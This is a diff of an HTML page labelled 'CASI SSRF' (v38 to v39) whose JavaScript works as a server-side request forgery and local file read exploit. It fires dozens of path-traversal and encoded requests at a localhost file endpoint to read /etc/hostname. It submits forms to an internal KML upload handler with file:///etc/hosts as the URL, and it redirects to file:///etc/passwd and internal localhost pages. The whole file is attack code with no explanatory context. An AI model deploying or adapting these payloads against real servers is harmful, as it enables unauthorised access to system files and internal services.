@@ -1,21 +1,14 @@
-<!doctype html><html><head><meta charset="utf-8"><title>CASI SSRF v38</title></head><body><h1 id="s">Loading...</h1><script>
-const q=new URLSearchParams(location.search),el=document.getElementById('s');
-if(q.get('lang')==='zzkml'){
- const m=Math.abs(Number(q.get('veh_id')||0))%4;
- const secure=m>1, target=m%2===0?'file:///etc/hostname':'file:///etc/hosts';
- const f=document.createElement('form'); f.method='POST'; f.enctype='multipart/form-data'; f.action=(secure?'https':'http')+'://127.0.0.1/ax/kml/kml.php?cmd=upload';
- const fields={type:'1',kml_url:target,kml_name:'casi_lfi_v38_'+m,kml_mutual:'0'};
- for(const [k,v] of Object.entries(fields)){const x=document.createElement('input');x.type='hidden';x.name=k;x.value=v;f.appendChild(x)}
- document.title='CASI KML V38 '+m; el.textContent='POST '+f.action+' URL='+target; document.body.appendChild(f); setTimeout(()=>f.submit(),100);
-}else{
- const i=Math.abs(Number(q.get('veh_id')||0))%8; document.title='V37 mod='+i;
- if(i===0){el.textContent='view-source:file';setTimeout(()=>location.replace('view-source:file:///etc/passwd'),100)}
- else if(i===1){el.textContent='file://localhost';setTimeout(()=>location.replace('file://localhost/etc/passwd'),100)}
- else if(i===2){el.textContent='form file';const f=document.createElement('form');f.method='GET';f.action='file:///etc/passwd';document.body.appendChild(f);setTimeout(()=>f.submit(),100)}
- else if(i===3){el.textContent='data+iframe';setTimeout(()=>location.replace("data:text/html,<iframe src='file:///etc/passwd' style='width:100%;height:100vh'></iframe>"),100)}
- else if(i===4){el.textContent='veh/list localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/veh/list.php?node=3'),100)}
- else if(i===5){el.textContent='tree localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/tree.php?node=3'),100)}
- else if(i===6){el.textContent='current_data localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/current_data.php?node=3'),100)}
- else{el.textContent='export_tree localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/export_tree.php?node=3'),100)}
-}
-</script></body></html>
+<!doctype html><html><head><meta charset="utf-8"><title>CASI SSRF v39</title></head><body><h1 id="s">Loading...</h1><script>const q=new URLSearchParams(location.search),el=document.getElementById('s');if(q.get('lang')==='zzdepth'){
+ const B='http://127.0.0.1:8080', jobs=[];
+ for(let d=1;d<=40;d++){const p='../'.repeat(d)+'etc/hostname';jobs.push({n:'raw'+d,u:B+'/file?name='+p});jobs.push({n:'enc'+d,u:B+'/file?name='+encodeURIComponent(p)})}
+ jobs.push({n:'absSlashes',u:B+'/file?name=////////etc/hostname'});
+ jobs.push({n:'procCwd',u:B+'/file?name='+encodeURIComponent('/proc/self/cwd/../../../../etc/hostname')});
+ jobs.push({n:'postForm',u:B+'/file',o:{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'name='+encodeURIComponent('/etc/hostname')}});
+ jobs.push({n:'postTextPath',u:B+'/file',o:{method:'POST',headers:{'Content-Type':'text/plain'},body:'/etc/hostname'}});
+ jobs.push({n:'postTextKV',u:B+'/file',o:{method:'POST',headers:{'Content-Type':'text/plain'},body:'name=/etc/hostname'}});
+ const fd=new FormData();fd.append('name','/etc/hostname');jobs.push({n:'postMultipart',u:B+'/file',o:{method:'POST',body:fd}});
+ jobs.push({n:'postJson',u:B+'/file',o:{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'/etc/hostname'})}});
+ jobs.push({n:'pathAbs',u:B+'/file/%2Fetc%2Fhostname'});
+ jobs.push({n:'pathTrav',u:B+'/file/..%2F..%2Fetc%2Fhostname'});
+ Promise.all(jobs.map(async j=>{try{const r=await fetch(j.u,j.o||{}),t=await r.text();return j.n+' '+r.status+' '+JSON.stringify(t.slice(0,160))}catch(e){return j.n+' ERR '+e}})).then(a=>{const hits=a.filter(x=>!x.includes(' 404 "not found"'));document.title='CASI V39 HITS '+hits.length;el.innerHTML='<pre>'+a.join('\n').replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))+'</pre>'})
+}else if(q.get('lang')==='zzkml'){ const m=Math.abs(Number(q.get('veh_id')||0))%4; const secure=m>1, target=m%2===0?'file:///etc/hostname':'file:///etc/hosts'; const f=document.createElement('form'); f.method='POST'; f.enctype='multipart/form-data'; f.action=(secure?'https':'http')+'://127.0.0.1/ax/kml/kml.php?cmd=upload'; const fields={type:'1',kml_url:target,kml_name:'casi_lfi_v39_'+m,kml_mutual:'0'}; for(const [k,v] of Object.entries(fields)){const x=document.createElement('input');x.type='hidden';x.name=k;x.value=v;f.appendChild(x)} document.title='CASI KML V39 '+m; el.textContent='POST '+f.action+' URL='+target; document.body.appendChild(f); setTimeout(()=>f.submit(),100);}else{ const i=Math.abs(Number(q.get('veh_id')||0))%8; document.title='V37 mod='+i; if(i===0){el.textContent='view-source:file';setTimeout(()=>location.replace('view-source:file:///etc/passwd'),100)} else if(i===1){el.textContent='file://localhost';setTimeout(()=>location.replace('file://localhost/etc/passwd'),100)} else if(i===2){el.textContent='form file';const f=document.createElement('form');f.method='GET';f.action='file:///etc/passwd';document.body.appendChild(f);setTimeout(()=>f.submit(),100)} else if(i===3){el.textContent='data+iframe';setTimeout(()=>location.replace("data:text/html,<iframe src='file:///etc/passwd' style='width:100%;height:100vh'></iframe>"),100)} else if(i===4){el.textContent='veh/list localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/veh/list.php?node=3'),100)} else if(i===5){el.textContent='tree localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/tree.php?node=3'),100)} else if(i===6){el.textContent='current_data localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/current_data.php?node=3'),100)} else{el.textContent='export_tree localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/export_tree.php?node=3'),100)}}</script></body></html>
